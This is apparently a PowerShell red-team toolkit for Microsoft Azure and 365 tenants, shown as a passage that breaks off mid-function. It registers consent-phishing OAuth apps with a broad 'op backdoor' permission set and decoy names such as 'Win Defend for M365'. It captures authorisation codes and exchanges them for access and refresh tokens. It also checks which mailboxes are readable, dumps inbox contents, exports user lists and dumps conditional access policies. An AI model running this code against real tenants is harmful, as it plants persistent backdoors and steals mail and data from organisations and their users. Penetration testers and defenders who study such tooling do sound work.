function Inject-OAuthApp{


<#
    .SYNOPSIS
        This is a CLI tool for automating the deployment of an app registration to a Microsoft Azure tenant. In the event that the Azure portal is locked down this may provide an additional mechanism for app deployment, provided that user's are allowed to register apps in the tenant.
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       This is a CLI tool for automating the deployment of an app registration to a Microsoft Azure tenant. In the event that the Azure portal is locked down this may provide an additional mechanism for app deployment, provided that user's are allowed to register apps in the tenant.        
    
    .PARAMETER AppName
        
        The display name of the App Registration. This is what will be displayed on the consent page.
    
    
    .PARAMETER ReplyUrl
        
        The reply URL to redirect a user to after app consent. This is where you will want to capture the OAuth code and complete the flow to obtain an access token and refresh token.
    
    .PARAMETER Scope
        
        Delegated Microsoft Graph permissions to scope to the app. Example: Mail.Read, User.ReadBasic.All, etc. Scope items need to be comma separated with each item in double quotes like this (-scope "Mail.Read","openid","email","profile","offline_access")
    
     .PARAMETER AccessToken
        
        Provide an already authenticated access token. 

    .EXAMPLE
        
        C:\PS> Inject-OAuthApp -AppName "Win Defend for M365" -Secret "HackThePlanet1337!" -ReplyUrl "https://windefend.azurewebsites.net" -scope "openid","Mail.Read","email","profile","offline_access"
        Description
        -----------
        This command will inject an app registration with the display name of "Win Defend for M365" with a scope of openid, Mail.Read, email, profile, and offline_access
    
    .EXAMPLE
        
        C:\PS> Inject-OAuthApp -AppName "Not a Backdoor" -ReplyUrl "https://windefend.azurewebsites.net" -scope "op backdoor" -AccessToken "eyJ0eXAiOiJKV..."
        Description
        -----------
        This command takes an already authenticated access token gathered from something like a device code login. It uses the hardcoded value of "op backdoor" as the scope to add a large number of permissions to the app registration. None of these permissions require admin consent. 
#>
  Param(


    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $AppName = "",

    [Parameter(Position = 1, Mandatory = $True)]
    [string]
    $ReplyUrl = "",

    [Parameter(Position = 2, Mandatory = $True)]
    [string[]]
    $Scope,
    
    [Parameter(Position = 3, Mandatory = $False)]
    [string[]]
    $AccessToken
  )
if($AccessToken){
    Write-Host -ForegroundColor yellow "[*] Using provided access token."
    $access_token = $AccessToken

}
else{
    # Login
    Write-Host -ForegroundColor yellow "[*] First you need to login as the user you want to deploy the app as."

    $body = @{
        "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        "resource" =      "https://graph.microsoft.com"
    }
    $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
    $Headers=@{}
    $Headers["User-Agent"] = $UserAgent
    $authResponse = Invoke-RestMethod `
        -UseBasicParsing `
        -Method Post `
        -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
        -Headers $Headers `
        -Body $body
    Write-Host -ForegroundColor yellow $authResponse.Message

    $continue = "authorization_pending"
    while($continue)
            {
    
        $body=@{
            "client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
            "code" =       $authResponse.device_code
        }
        try{
        $global:tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body
        }
        catch{
        $details=$_.ErrorDetails.Message | ConvertFrom-Json
        $continue = $details.error -eq "authorization_pending"
        Write-Output $details.error
        }
        if($tokens)
            {
                write-host -ForegroundColor yellow '[*] Successful Auth! Access and refresh tokens are accessible in the $tokens variable.'
                $access_token = $tokens.access_token
                break
            }
        Start-Sleep -Seconds 3
    }    

}
$Headers = @{
    Authorization = "Bearer $access_token"
}

# Get Microsoft Graph Object ID
Write-Host -ForegroundColor yellow "[*] Getting Microsoft Graph Object ID"


# Get full service principal list

$initialUrl = "https://graph.microsoft.com/v1.0/servicePrincipals"
$headers = @{"Authorization" = "Bearer $access_token"}

# Initialize an array to store all collected data
$allData = @()

# Loop until there's no more nextLink
do {
    # Invoke the web request
    $response = Invoke-WebRequest -Uri $initialUrl -Headers $headers

    # Convert the response content to JSON
    $jsonData = $response.Content | ConvertFrom-Json

    # Add the current page's data to the array
    $allData += $jsonData.value

    # Check if there's a nextLink
    if ($jsonData.'@odata.nextLink') {
        $initialUrl = $jsonData.'@odata.nextLink'
    } else {
       
        break
    }
} while ($true)

$appDisplayNameToSearch = "Microsoft Graph"
$graphId = $allData | Where-Object { $_.appDisplayName -eq $appDisplayNameToSearch } | Select-Object -ExpandProperty appId
$graphIdInternal = $allData | Where-Object { $_.appDisplayName -eq $appDisplayNameToSearch } | Select-Object -ExpandProperty Id
Write-Output "Graph ID: $graphId"
Write-Output "Internal Graph ID: $graphIdInternal"

# Get Object IDs of individual permissions
Write-Host -ForegroundColor yellow "[*] Now getting object IDs for scope objects:"
$spns = Invoke-WebRequest -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$graphIdInternal" -Headers $headers
$spnsjson = $spns.Content | ConvertFrom-Json

if ($Scope -like "op backdoor")
{
    $Scope = "openid","profile","offline_access","email","User.Read","User.ReadBasic.All","Mail.Read","Mail.Send","Mail.Read.Shared","Mail.Send.Shared","Files.ReadWrite.All","EWS.AccessAsUser.All","ChatMessage.Read","ChatMessage.Send","Chat.ReadWrite","Chat.Create","ChannelMessage.Edit","ChannelMessage.Send","Channel.ReadBasic.All","Presence.Read.All","Team.ReadBasic.All","Team.Create","Sites.Manage.All","Sites.Read.All","Sites.ReadWrite.All","Policy.Read.ConditionalAccess"
    Write-Host -ForegroundColor yellow "[*] One overpowered (OP) backdoor is coming right up! Here is the scope:"
}
$scopeurl = ""
$accesslist = ""
$scopeIds = @{}
$joinedScope = $Scope -join " "
$joinedScope

# Loop through each item in $Scope
foreach ($item in $Scope){
    $variableName = $item -replace "[\W\d]", ""  # Remove non-alphanumeric characters and digits
    $variableName = $variableName + "Scope"
    

    $scopeItem = $spnsjson.oauth2PermissionScopes | Where-Object { $_.value -eq "$item" } |select-object id
    $scopeId = ('"' + $scopeItem.Id +'"')
    if (!$scopeId){Write-host -foregroundcolor red "[**] Couldn't find scope option $item"}
    else{
    Write-Host ($item + " : " + $scopeId)
    $scopeurl += "$item%20"
    $accesslist += '{"id": ' + $scopeId + ',"type": "Scope"},'
    
    # Store the scope ID in the hashtable
    $scopeIds[$variableName] = $scopeId
    }
}

Write-Host -ForegroundColor yellow "[*] Finished collecting object IDs of permissions."
# Create a resources variable
$permissions = $accesslist.Trim(",")

$resources = @"
{"resourceAppId": "$graphId", "resourceAccess": [$permissions]}
"@

# Create the app in the tenant
Write-host -ForegroundColor yellow "[*] Now deploying the app registration with display name $AppName to the tenant."

$resourceAccess = $resources | ConvertFrom-Json

# Construct the JSON body
$jsonBody = @{
    displayName         = $AppName
    signInAudience      = "AzureADMultipleOrgs"
    keyCredentials      = @()
    web                 = @{
        redirectUris = @($ReplyUrl)
    }
    requiredResourceAccess = @(
        @{
            resourceAppId   = $resourceAccess.resourceAppId
            resourceAccess = $resourceAccess.resourceAccess
        }
    )
}

# Convert the JSON body to a properly formatted JSON string
$finalJson = $jsonBody | ConvertTo-Json -Depth 10

$appcreationheaders = @{
    Authorization = "Bearer $access_token"
    "Content-Type" = "application/json"
    "Accept-Encoding" = "gzip, deflate"
}


$appresponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/applications" -Headers $appcreationheaders  -Method Post -Body $finaljson

if (!$appresponse){
    Write-host -ForegroundColor red "[*] An error occurred during deployment."
    break
}

$currentTime = Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ"
$oneYearLater = (Get-Date).AddYears(1).ToString("yyyy-MM-ddTHH:mm:ssZ")
$secretCredential = @{
    passwordCredential = @{
        displayName = $null
        endDateTime = $oneYearLater
        startDateTime = $currentTime
    }
}
$SecretBody = $secretCredential | ConvertTo-Json
$applicationid = $appresponse.id
$secretrequest = Invoke-WebRequest -Headers $Headers -Method POST -ContentType "application/json" -Body $SecretBody -Uri "https://graph.microsoft.com/v1.0/applications/$applicationid/addPassword"

$secretdata = $secretrequest.Content |ConvertFrom-json

# Generate the Consent URL
Write-host -ForegroundColor yellow "[*] If everything worked successfully this is the consent URL you can use to grant consent to the app:"
$consentURL = "https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize?client_id=" + $appresponse.AppId + "&response_type=code&redirect_uri=
" + [System.Web.HttpUtility]::UrlEncode($ReplyUrl) + "&response_mode=query&scope=" + $scopeurl.Trim("%20") + "&state=1234"
Write-Host "--------------------------------------------------------"
Write-Host -ForegroundColor green $consentURL
Write-Host "--------------------------------------------------------"
Write-Host ("Application ID: " + $appresponse.AppId)

Write-Host ("Secret: " + $Secretdata.secretText)
Write-Host "--------------------------------------------------------"

if($ReplyUrl -match "localhost" -or $ReplyUrl -match "127.0.0.1"){
Write-Host "Localhost detected in Reply URL field. You can use the Invoke-AutoOAuthFlow module to complete the OAuth flow automatically."
Write-Host "--------------------------------------------------------"
$scopeclean = ('"' + $scopeurl.replace('%20', ' ').Trim(" ") + '"')
Write-Host -ForegroundColor Cyan ('Invoke-AutoOAuthFlow -ClientId "' + $appresponse.AppId + '" -ClientSecret "' + $Secretdata.secretText + '" -RedirectUri "' + $ReplyURL + '" -scope ' + $scopeclean)
}
else{
Write-Host "After you obtain an OAuth Code from the redirect URI server you can use this command to complete the flow:"
Write-Host "--------------------------------------------------------"
$scopeclean = ('"' + $scopeurl.replace('%20', ' ').Trim(" ") + '"')
Write-Host -ForegroundColor Cyan ('Get-AzureAccessToken -ClientId "' + $appresponse.AppId + '" -ClientSecret "' + $Secretdata.secretText + '" -RedirectUri "' + $ReplyURL + '" -scope ' + $scopeclean + " -AuthCode <insert your OAuth Code here>")
}
}


Function Invoke-GraphOpenInboxFinder{
    param(
    [Parameter(Position = 0, Mandatory = $true)]
    [string]
    $access_token = "",
    [Parameter(Position = 0, Mandatory = $true)]
    [string]
    $userlist = ""
    )

    $Mailboxes = @(Get-Content -Path $userlist)
    $count = $Mailboxes.count
    $curr_mbx = 0

    Write-Output "`n`r"
    Write-Output "[*] Checking access to mailboxes for each email address..."
    Write-Output "`n`r"
    foreach($mbx in $Mailboxes)
    {
        $request = ""
        Write-Host -nonewline "$curr_mbx of $count mailboxes checked`r"
        $curr_mbx += 1
        try { $request = Invoke-WebRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/users/$mbx/mailFolders/Inbox/messages" -Headers @{"Authorization" = "Bearer $access_token"} 
        }catch{
            $err = $_.Exception.Response.StatusCode.Value__
        }
    
        If ($request.StatusCode -eq 200){
            Write-Host -ForegroundColor Green "[*] SUCCESS! Inbox of $mbx is readable."
            $out = $request.Content | ConvertFrom-Json
            Write-Host ("Latest Email Received " + $out.value.createdDateTime + " with subject: " + $out.value.subject)
        }
    }
}

## A few tools for working with Azure OAuth2 Authentication Codes and access_tokens
## By Beau Bullock @dafthack

Function Get-AzureAccessToken{

Param
(
    [Parameter(Position = 0, Mandatory = $true)]
    [string]
    $Scope = "",

    [Parameter(Position = 1, Mandatory = $true)]
    [string]
    $ClientID = "",

    [Parameter(Position = 2, Mandatory = $true)]
    [string]
    $ClientSecret = "",

    [Parameter(Position = 3, Mandatory = $true)]
    [string]
    $RedirectUri = "",

    [Parameter(Position = 4, Mandatory = $true)]
    [string]
    $AuthCode = ""
)

$body = @{client_id=$ClientID
scope=$Scope
code=$AuthCode
redirect_uri=$RedirectUri
grant_type="authorization_code"
client_secret=$ClientSecret
}

$request = Invoke-WebRequest -Method POST -ContentType "application/x-www-form-urlencoded" -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body
$parsed = $request.Content | ConvertFrom-Json
Write-Output "---Here is your access token---"
$parsed.access_token
Write-Output "---Here is your refresh token---"
$parsed.refresh_token
}

Function Check-MSGraphAccess{
    param(
    [Parameter(Position = 0, Mandatory = $true)]
    [string]
    $access_token = ""
    )

$request = Invoke-WebRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/me" -Headers @{"Authorization" = "Bearer $access_token"}
$out = $request.Content | ConvertFrom-Json
$out
}

Function Get-NewAccessTokenWithRefreshToken{
Param
(
    [Parameter(Position = 0, Mandatory = $false)]
    [string]
    $Scope = "openid offline_access email user.read profile",

    [Parameter(Position = 1, Mandatory = $true)]
    [string]
    $ClientID = "",

    [Parameter(Position = 2, Mandatory = $true)]
    [string]
    $ClientSecret = "",

    [Parameter(Position = 3, Mandatory = $true)]
    [string]
    $RedirectUri = "",

    [Parameter(Position = 4, Mandatory = $true)]
    [string]
    $RefreshToken = ""
)

$body = @{client_id=$ClientID
scope=$Scope
refresh_token=$RefreshToken
redirect_uri=$RedirectUri
grant_type="refresh_token"
client_secret=$ClientSecret
}

$request = Invoke-WebRequest -Method POST -ContentType "application/x-www-form-urlencoded" -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body
$parsed = $request.Content | ConvertFrom-Json
Write-Output "---Here is your access token---"
$parsed.access_token
Write-Output "---Here is your refresh token---"
$parsed.refresh_token


}


Function Invoke-AutoOAuthFlow{
Param
(
    [Parameter(Position = 0, Mandatory = $true)]
    [string]
    $Scope = "",

    [Parameter(Position = 1, Mandatory = $true)]
    [string]
    $ClientID = "",

    [Parameter(Position = 2, Mandatory = $true)]
    [string]
    $ClientSecret = "",

    [Parameter(Position = 3, Mandatory = $true)]
    [string]
    $RedirectUri = ""
)
Add-Type -AssemblyName System.Web

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://localhost:10000/")
$listener.Start()

Write-Host "Listening for incoming requests on http://localhost:10000/"

$context = $listener.GetContext() # This blocks until a request is received
$request = $context.Request
$response = $context.Response

# Capture the OAuth code from the query parameters
$queryParams = [System.Web.HttpUtility]::ParseQueryString($request.Url.Query)
$oauthCode = $queryParams["code"]

# You can now process the OAuth code as needed
Write-Host "Captured OAuth code: $oauthCode"

# Respond to the client
$responseText = "OAuth code captured successfully."
$responseBytes = [System.Text.Encoding]::UTF8.GetBytes($responseText)
$response.OutputStream.Write($responseBytes, 0, $responseBytes.Length)
$response.Close()

$listener.Stop()

Get-AzureAccessToken -ClientId $ClientID -ClientSecret $ClientSecret -RedirectUri $RedirectUri -scope $Scope -AuthCode $oauthCode

}

Function Get-Inbox{
    param(
    [Parameter(Position = 0, Mandatory = $true)]
    [string]
    $access_token = "",
    [Parameter(Position = 0, Mandatory = $true)]
    [string]
    $userid = ""
    )

$request = Invoke-WebRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/users/$userid/mailFolders/Inbox/messages" -Headers @{"Authorization" = "Bearer $access_token"}
$out = $request.Content | ConvertFrom-Json

$out.value


}


Function Get-AzureADUsers{
    param(
    [Parameter(Position = 0, Mandatory = $true)]
    [string]
    $access_token = "",
    [Parameter(Position = 1, Mandatory = $true)]
    [string]
    $outfile = ""
    )

$request = Invoke-WebRequest -Method GET -Uri "https://graph.microsoft.com/v1.0/users" -Headers @{"Authorization" = "Bearer $access_token"}
$out = $request.Content | ConvertFrom-Json

Write-Output "---All Azure AD User Principal Names---"
$out.value.userPrincipalName 
$out.value.userPrincipalName | Out-File -Encoding ASCII $outfile
}



Function Invoke-DumpCAPS{
<#
    .SYNOPSIS
        Tool for dumping conditional access policies
        Author: Beau Bullock (@dafthack)
        License: MIT
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        
       Tool for dumping conditional access policies       
    
    .PARAMETER Domain
        
        Domain for the tenant
    
    
    .PARAMETER ResolveGuids
        
        Switch to resolve user and group guids if wanted
    

    .EXAMPLE
        
        C:\PS> Invoke-DumpCAPS -Domain glitchcloud.com -ResolveGuids
        Description
        -----------
        This command will dump conditional access policies from the tenant and resolve user and group guids.
    
#>


    Param(


    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $Domain = "",

    [Parameter(Position = 1, Mandatory = $False)]
    [switch]
    $ResolveGuids

  )

    # Login
    Write-Host -ForegroundColor yellow "[*] First you need to login."

    $body = @{
        "client_id" =     "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
        "resource" =      "https://graph.windows.net/"
    }
    $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
    $Headers=@{}
    $Headers["User-Agent"] = $UserAgent
    $authResponse = Invoke-RestMethod `
        -UseBasicParsing `
        -Method Post `
        -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
        -Headers $Headers `
        -Body $body
    Write-Host -ForegroundColor yellow $authResponse.Message

    $continue = "authorization_pending"
    while($continue)
            {
    
        $body=@{
            "client_id" =  "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
            "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
            "code" =       $authResponse.device_code
        }
        try{
        $aadtokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body
        }
        catch{
        $details=$_.ErrorDetails.Message | ConvertFrom-Json
        $continue = $details.error -eq "authorization_pending"
        Write-Output $details.error
        }
        if($aadtokens)
            {
                $access_token = $aadtokens.access_token
                break
            }
        Start-Sleep -Seconds 3
    }   
 
    $HeadersAuth = @{
        Authorization = "Bearer $access_token"
    }

    $CAPSUrl = "https://graph.windows.net/$domain/policies?api-version=1.61-internal"
    $CAPS = Invoke-RestMethod -Method GET -Uri $CAPSUrl -Headers $HeadersAuth
    $parsedjson = $CAPS 

    Write-Host -ForegroundColor Yellow "[*] Now dumping conditional access policies from the tenant."
    # Iterate through each policy object and print the details
    foreach ($policy in $parsedJson.value) {
        $policyType = $policy.policyType
        $displayName = $policy.displayName
        $policyDetail = $policy.policyDetail | ConvertFrom-Json
        if ($policyType -eq "18"){
            # Process the PolicyDetail field
            $policyState = $policyDetail.State
            $conditionspreformat = $policyDetail.Conditions 
            $controls = $policyDetail.Controls.Control -join ", "

            # Print the policy details
            # If the policy is disabled print in gray
            if ($policyState -eq "Disabled") {
                Write-Host -ForegroundColor DarkGray "Display Name: $displayName"
                Write-Host -ForegroundColor DarkGray  "Policy Type: $policyType"
                Write-Host -ForegroundColor Red "Policy State: $policyState"
                Write-Host -ForegroundColor DarkGray  "Conditions:`n"
                $formattedConditions = @()

                foreach ($condition in $conditionspreformat.PSObject.Properties) {
                    $conditionType = $condition.Name
                    $conditionData = $condition.Value

                    $conditionText = ""

                    foreach ($includeExclude in @("Include", "Exclude")) {
                        if ($conditionData.$includeExclude) {
                            $conditionValues = @()

                            foreach ($includeData in $conditionData.$includeExclude) {
                                $includeType = $includeData.PSObject.Properties.Name
                                $includeValues = $includeData.PSObject.Properties.Value -split ', '  
                                $resolvedUsers = @()
                                if($ResolveGuids){
                                    foreach ($guid in $includeValues) {
                                        if ($guid -match '^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$') {
                                            $resolvedUser = ResolveGUID $guid $HeadersAuth
                                            $resolvedUsers += $resolvedUser
                                        } else {
                                            $resolvedUsers += $guid
                                        }
                                    }
                                }
                                else{
                                    foreach ($guid in $includeValues) {
                                        $resolvedUsers += $guid
                                    }
                                }
                                $includeValue = "$($resolvedUsers -join ', ')"
                                $conditionValues += "`t`t`t$includeType : $includeValue"
                            }

                            if ($conditionValues.Count -gt 0) {
                                $conditionText += "`t`t$includeExclude :`n$($conditionValues -join "`n")`n"
                            }
                        }
                    }

                    $formattedCondition = "`t$conditionType :`n$conditionText"
                    Write-Host -ForegroundColor DarkGray $formattedCondition
                }
                Write-Host -ForegroundColor DarkGray  "Controls: $controls"
            } else {
                Write-Host "Display Name: $displayName"
                Write-Host "Policy Type: $policyType"
                Write-Host "Policy State: $policyState"
                Write-Host "Conditions:`n"
                $formattedConditions = @()

                foreach ($condition in $conditionspreformat.PSObject.Properties) {
                    $conditionType = $condition.Name
                    $conditionData = $condition.Value

                    $conditionText = ""

                    foreach ($includeExclude in @("Include", "Exclude")) {
                        if ($conditionData.$includeExclude) {
                            $conditionValues = @()

                            foreach ($includeData in $conditionData.$includeExclude) {
                                $includeType = $includeData.PSObject.Properties.Name
                                $includeValues = $includeData.PSObject.Properties.Value -split ', '  
                                $resolvedUsers = @()
                                if($ResolveGuids){
                                    foreach ($guid in $includeValues) {
                                        if ($guid -match '^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$') {
                                            $resolvedUser = ResolveGUID $guid $HeadersAuth
                                            $resolvedUsers += $resolvedUser
                                        } else {
                                            $resolvedUsers += $guid
                                        }
                                    }
                                }
                                else{
                                    foreach ($guid in $includeValues) {
                                        $resolvedUsers += $guid
                                    }
                                }
                                $includeValue = "$($resolvedUsers -join ', ')"
                                $conditionValues += "`t`t`t$includeType : $includeValue"
                            }

                            if ($conditionValues.Count -gt 0) {
                                $conditionText += "`t`t$includeExclude :`n$($conditionValues -join "`n")`n"
                            }
                        }
                    }

                    $formattedCondition = "`t$conditionType :`n$conditionText"
                    $formattedCondition
                }
    
                Write-Host "Controls: $controls"
            }
            # Separator
            Write-Host ("=" * 80) 
        }
    }
}



function ResolveGUID($guid,$HeadersAuth) {
        $url = "https://graph.windows.net/$domain/directoryObjects/$guid/?api-version=1.61-internal"
        try{
        $resolvedObject = Invoke-RestMethod -Method Get -Uri $url -Headers $HeadersAuth -ErrorAction Stop
        } catch {
        return "Unresolved: $guid"
        continue
        }
        if ($resolvedObject.objectType -eq "User") {
            return "$($resolvedObject.userPrincipalName)"
        } elseif ($resolvedObject.objectType -eq "Group") {
            return "$($resolvedObject.displayName)"
        } else {
            return "Unresolved: $guid"
        }
    }



Function Invoke-DumpApps{
Param(

    [Parameter(Position = 0, Mandatory = $True)]
    [string]
    $Domain = ""

  )

Write-Host -ForegroundColor yellow "[*] First you need to login"

    $body = @{
        "client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        "resource" =      "https://graph.microsoft.com"
    }
    $UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
    $Headers=@{}
    $Headers["User-Agent"] = $UserAgent
    $authResponse = Invoke-RestMethod `
        -UseBasicParsing `
        -Method Post `
        -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" `
        -Headers $Headers `
        -Body $body
    Write-Host -ForegroundColor yellow $authResponse.Message

    $continue = "authorization_pending"
    while($continue)
            {
    
        $body=@{
            "client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
            "code" =       $authResponse.device_code
        }
        try{
        $global:tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0" -Headers $Headers -Body $body
        }
        catch{
        $details=$_.ErrorDetails.Message | ConvertFrom-Json
        $continue = $details.error -eq "authorization_pending"
        Write-Output $details.error
        }
        if($tokens)
            {
                write-host -ForegroundColor Yellow '[*] Successful Auth! Access and refresh tokens are accessible in the $tokens variable.'
                $accesstoken = $tokens.access_token
                $refreshToken = $tokens.refresh_token
                break
            }
        Start-Sleep -Seconds 3
    }    

   
Write-Host -ForegroundColor yellow "[*] Getting Microsoft Graph Object ID"

# Get full service principal list

$initialUrl = "https://graph.microsoft.com/v1.0/servicePrincipals"
$headers = @{"Authorization" = "Bearer $accesstoken"}

# Initialize an array to store all collected data
$allData = @()

# Loop until there's no more nextLink
do {
    # Invoke the web request
    $response = Invoke-WebRequest -Uri $initialUrl -Headers $headers

    # Convert the response content to JSON
    $jsonData = $response.Content | ConvertFrom-Json

    # Add the current page's data to the array
    $allData += $jsonData.value

    # Check if there's a nextLink
    if ($jsonData.'@odata.nextLink') {
        $initialUrl = $jsonData.'@odata.nextLink'
    } else {
       
        break
    }
} while ($true)

$appDisplayNameToSearch = "Microsoft Graph"
$graphId = $allData | Where-Object { $_.appDisplayName -eq $appDisplayNameToSearch } | Select-Object -ExpandProperty appId
$graphIdInternal = $allData | Where-Object { $_.appDisplayName -eq $appDisplayNameToSearch } | Select-Object -ExpandProperty Id
Write-Output "Graph ID: $graphId"
Write-Output "Internal Graph ID: $graphIdInternal"

# Get Object IDs of individual permissions
Write-Host -ForegroundColor yellow "[*] Now getting object IDs for scope objects:"
$spns = Invoke-WebRequest -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$graphIdInternal" -Headers $headers
$spnsjson = $spns.Content | ConvertFrom-Json

# Construct the Graph API endpoint
$graphApiUrl = "https://graph.microsoft.com/v1.0"

# Query app registrations
$appRegistrations = Invoke-RestMethod -Uri "$graphApiUrl/applications" -Headers @{ Authorization = "Bearer $accessToken" }

# Separator
            Write-Host ("=" * 80) 

# Loop through each app registration
foreach ($app in $appRegistrations.value) {
    $appId = $app.appId
    $appName = $app.displayName
    $createtime = $app.createdDateTime
    $signinaudience = $app.signInAudience
    
    # Query users who have consented to the app's permissions
    $approleurl = ($graphApiUrl + "/servicePrincipals(appId='" + $appId + "')/appRoleAssignedTo")
    $consentedUsers = Invoke-RestMethod -Uri $approleurl -Headers @{ Authorization = "Bearer $accessToken" }
    
    # Display app information and consented users
    Write-Host "App Name: $appName (App ID: $appId)"
    Write-Host "Creation Date: $createtime"
    Write-Host "Sign-In Audience: $signinaudience"
    foreach ($user in $consentedUsers.value) {
        $userId = $user.principalId
        $userDisplayName = $user.principalDisplayName
        Write-Host "Consented User: $userDisplayName (User ID: $userId)"
    }
    # Loop through each resource access entry
    foreach ($resourceAccess in $app.requiredResourceAccess) {
        $resourceAppId = $resourceAccess.resourceAppId
        $appscopes = @()
        $delegatedscopes = @()

        # Loop through each resource access item
        foreach ($accessItem in $resourceAccess.resourceAccess) {
            $scopeGuid = $accessItem.id
            
            # Use the spn list to find names of permissions
            foreach($approle in $spnsjson.appRoles){
                if ($scopeGuid -like $approle.id) {
                    $scopeName = $approle.value
                    $appscopes += $scopeName
                }
            }
            foreach($scoperole in $spnsjson.oauth2PermissionScopes){
                if ($scopeGuid -like $scoperole.id) {
                    $dscopeName = $scoperole.value
                    $delegatedscopes += $dscopeName
                }
            }
        }

        # Display the resource app ID and associated permission names (scopes)
        if ($appscopes.Count -gt 0) {
            Write-Host "App Permissions (Scopes): $($appscopes -join ', ')"
        }
        if ($delegatedscopes -gt 0) {
            Write-Host "Delegated Permissions (Scopes): $($delegatedscopes -join ', ')"
        }
    }
    Write-Host ""
    # Separator
            Write-Host ("=" * 80) 
} 

        Write-Host -ForegroundColor yellow "[*] Now looking for external apps. Any apps displayed below are not owned by the current tenant or Microsoft's main app tenant."
        Write-Host ("=" * 80) 

        $orginfo = Invoke-RestMethod -Uri "$graphApiUrl/organization" -Headers $headers
        $tenantid = $orginfo.value.id

        $authUrl = "https://login.microsoftonline.com/$domain"
        $unsupurl = "https://main.iam.ad.ext.azure.com"

        $unsupbody = @{
                "resource" = "74658136-14ec-4630-ad9b-26e160ff0fc6"
                "client_id" =     "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
                "grant_type" =    "refresh_token"
                "refresh_token" = $refreshToken
                "scope"=         "openid"
            }

        $unsuptokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "$($authUrl)/oauth2/token" -Headers $Headers -Body $unsupbody
        $unsupaccesstoken = $unsuptokens.access_token

    foreach ($serviceprincipal in $allData){
        $EntAppsScope = ""
        # Filter out Microsoft Tenant service principals like Kaizala, Teams, etc... MS Tenant = f8cdef31-a31e-4b4a-93e4-5f571e91255a
        if ($serviceprincipal.AppOwnerOrganizationId -ne "f8cdef31-a31e-4b4a-93e4-5f571e91255a" -and $serviceprincipal.AppOwnerOrganizationId -ne $tenantid)
        {
           $body = @{
            "client_id" =     "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
            "resource" =      "74658136-14ec-4630-ad9b-26e160ff0fc6"
        }
            $unsupheaders = @{
                "Authorization"          = "Bearer " + $unsupaccesstoken
                "Content-type"           = "application/json"
                "X-Requested-With"       = "XMLHttpRequest"
                "x-ms-client-request-id" = [guid]::NewGuid()
                "x-ms-correlation-id"    = [guid]::NewGuid()
            }

            $unsupfullurl = ($unsupurl + "/api/EnterpriseApplications/" + $serviceprincipal.Id + "/ServicePrincipalPermissions?consentType=User&userObjectId=")
            $EntAppsScope = Invoke-RestMethod -Method GET -Uri $unsupfullurl -Headers $unsupheaders

            $unsupAdminfullurl = ($unsupurl + "/api/EnterpriseApplications/" + $serviceprincipal.Id + "/ServicePrincipalPermissions?consentType=Admin&userObjectId=")
            $EntAppsAdminScope = Invoke-RestMethod -Method GET -Uri $unsupAdminfullurl -Headers $unsupheaders
            
            

            Write-Host ("External App: " + $serviceprincipal.displayName)
            Write-Host ("AppId: " + $serviceprincipal.AppId)
            Write-Host ("Object ID: " + $serviceprincipal.Id)
            Write-Host ("appOwnerOrganizationId: " + $serviceprincipal.appOwnerOrganizationId)
            Write-Host ("Creation Date: " + $serviceprincipal.createdDateTime)
            Write-Host "Scope of Consent:"
            Foreach ($Entscopeitem in $EntAppsScope){
            $principals = @()
            foreach($userorgroup in $Entscopeitem.principalIds){
                $userobject = Invoke-RestMethod -uri "$($graphApiUrl)/users/$userorgroup" -Headers $headers
                $principals += $userobject.userPrincipalName
            }
            Write-Host ($Entscopeitem.permissionId + ", " + $Entscopeitem.permissionType + ", " + $($principals -join '; '))
            }
            Foreach ($Entscopeadminitem in $EntAppsAdminScope){
            $principals = @()
            foreach($userorgroup in $Entscopeadminitem.principalIds){
